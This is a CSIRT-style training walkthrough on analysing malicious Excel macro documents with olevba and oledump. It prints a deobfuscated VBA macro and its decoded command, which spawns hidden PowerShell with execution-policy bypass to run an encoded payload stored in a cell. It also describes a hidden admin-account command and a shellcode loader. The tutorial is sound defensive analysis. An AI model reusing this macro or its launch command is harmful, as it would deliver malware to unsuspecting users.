# Analyzing Excel Doc Macros

There are three general types of malicious Office documents you will see:

- Documents with a VBA macro that rely on the user enabling macros
- Documents with Embedded OLE objects that rely on the user executing them
- Documents that exploit Office and deliver embedded shellcode

<br>

We'll use the following tools to analyze the first type:

- [olevba](#olevba)
- [oledump](#oledump)

<br>

Use the following documents which can be found on the OOB at
/CSIRT/Sample-Files/:

- Cheat_Codes_List.xls
- Crispy_Bacon_Coupon.xls
- Important_Message.xls

<br>

## Olevba

Inspect each file with the command  `olevba.py <filename>`

### Cheat_Codes_List.xls

![](images/Analyzing%20Excel%20Doc%20Macros/image001.jpg)


Olevba discovered three VBA macros, two of which are empty.  The Module1
macro contains some suspicious commands, and an executable file.

Running olevba.py with the `--reveal` switch can translate some of the
obfuscation to the actual commands:

![](images/Analyzing%20Excel%20Doc%20Macros/image002.jpg)


### Crispy_Bacon_Coupon.xls

![](images/Analyzing%20Excel%20Doc%20Macros/image003.jpg)


Olevba discovered three VBA macros, two of which are empty.  The Module1
macro contains a suspicious shell command, and hex-encoded strings.

### Important_Message.xls

![](images/Analyzing%20Excel%20Doc%20Macros/image004.jpg)


Olevba discovered three VBA macros, two of which are empty.  The Module1
macro contains some suspicious commands and hex-encoded strings.

Running olevba.py with the `--reveal` switch can translate some of the
obfuscation to the actual commands:

![](images/Analyzing%20Excel%20Doc%20Macros/image005.jpg)


## Oledump

Get a summary of each file by typing `oledump.py <filename>`

![](images/Analyzing%20Excel%20Doc%20Macros/image006.jpg)


![](images/Analyzing%20Excel%20Doc%20Macros/image007.jpg)


All the malicious macros are identified by the capital "M"

Let's look at each file individually.

### Cheat_Codes_List.xls

Select the macro discovered by typing `oledump.py -s 7 Cheat_Codes_List.xls`

![](images/Analyzing%20Excel%20Doc%20Macros/image008.jpg)


This needs to be decompressed.  Select the same stream while also
decompressing it with `oledump.py -s 7 -v Cheat_Codes_List.xls`

Now we can see the macro contents just as if we opened it with Microsoft
Office.

We need to substitute the translated characters with their ASCII values
to see what commands are being run:

```
Sub vvUMygeP()

    Dim x, c As String

    x = GetVal(1181, 1181, 236)

    c = "poW" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) &
Chr(76) & "l.eXe -nop -noni " & _

    "-win" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) &
Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) &
Chr(100) & _

    "den " & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) &
Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115)
& "" & _

    " -e" & "nc " & x

    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")

    s.Run c, 0

End Sub
```

There are three sections that are using characters for obfuscation. 
Olevba has already translated these, but we can also use the
`decoder_chr.py` plugin:

![](images/Analyzing%20Excel%20Doc%20Macros/image009.jpg)


Now we can look at the complete command being run by Wscript.shell:

```
c = powershell.exe -nop -noni -windowstyle hidden -exec bypass -enc x
```

So the powershell script is executing "x", but what is "x"? 

```
x = GetVal(1181, 1181, 236)
```


It appears to be the values of a cell in the document.  Let's open it in
Office and confirm...

![](images/Analyzing%20Excel%20Doc%20Macros/image010.png)


Sure enough there is what looks to be Base64-encoded data on row 1181,
column IB

To find what stream it is located in, we can make a simple Yara rule and
use oledump's Yara rule option to search for it:

![](images/Analyzing%20Excel%20Doc%20Macros/image011.jpg)


Stream 4 contains the data we want so let's dump it with the `-d` switch:

```
oledump.py -s 4 -d Cheat_Codes_List.xls
```

![](images/Analyzing%20Excel%20Doc%20Macros/image012.jpg)


This dumps the entire stream but all we need is the string of data which
is the argument to the powershell command.

Easiest thing to do is pipe the output to the strings command, grep that
output for our string, and also Base64-decode the string all at the same
time:

![](images/Analyzing%20Excel%20Doc%20Macros/image013.jpg)


Now we have the full URL of the malware the document tries to download.

### Crispy_Bacon_Coupon.xls

Investigate the macro while also decompressing it with `oledump.py -s
7 -v Crispy_Bacon_Coupon.xls`

![](images/Analyzing%20Excel%20Doc%20Macros/image014.jpg)


This is also executing something in another area of the document named
"Subject". 

Check the file's metadata with `oledump.py -M
Crispy_Bacon_Coupon.xls`

![](images/Analyzing%20Excel%20Doc%20Macros/image015.jpg)


Notice the **Subject** field and what command will be executed...

This command will add a new user named "eviladmin" and add that user to
the Administrators group.

### Important_Message.xls

Investigate the macro while also decompressing it with `oledump.py -s
7 -v Important_Message.xls`

Olevba already showed us that only the word "Powershell.exe" and some
quotation marks are obfuscated.

Now we can complete the important part of the code which is the
following:

```
c = powershell.exe -nop -noni -windowstyle hidden -exec bypass -command "x"
```

Again, x appears to be located in a cell:

```
x = GetVal(3616, 3616, 153)
```

On the 3616th row in column EW we see the data that is being used:

![](images/Analyzing%20Excel%20Doc%20Macros/image016.png)


We can use another Yara rule which looks for a unique string and
identifies the stream containing the code we're after (stream 4):

![](images/Analyzing%20Excel%20Doc%20Macros/image017.jpg)


Open and decompress the stream with `oledump.py -s 4
Important_Message.xls` and find the start of the code:

![](images/Analyzing%20Excel%20Doc%20Macros/image018.jpg)


Dumping the stream with `oledump.py -s 4 -d Important_Message.xls`
allows us to recover the entire powershell script:

![](images/Analyzing%20Excel%20Doc%20Macros/image019.jpg)


The "VQzVJbzbCLzb" variable contains a byte array which is most likely
shellcode.  We can try to convert to ASCII with CyberChef to confirm:

![](images/Analyzing%20Excel%20Doc%20Macros/image020.jpg)


This indicates it is most likely shellcode which we can convert to an
executable for further analysis.

First the hex must be in the right format:

![](images/Analyzing%20Excel%20Doc%20Macros/image021.jpg)


The hex shellcode can be converted into an executable by using the
`shell2exe.py` tool:

![](images/Analyzing%20Excel%20Doc%20Macros/image022.jpg)


Then we can do static analysis like we would any other executable:

![](images/Analyzing%20Excel%20Doc%20Macros/image023.png)


It is not encoded so we can see the ip address used for C2 along with
what appears to be a file path with a long, random filename that is
frequently seen with meterpreter payloads.

We can also use this executable we made to perform dynamic analysis and
code analysis on Ollydbg/Immunity.
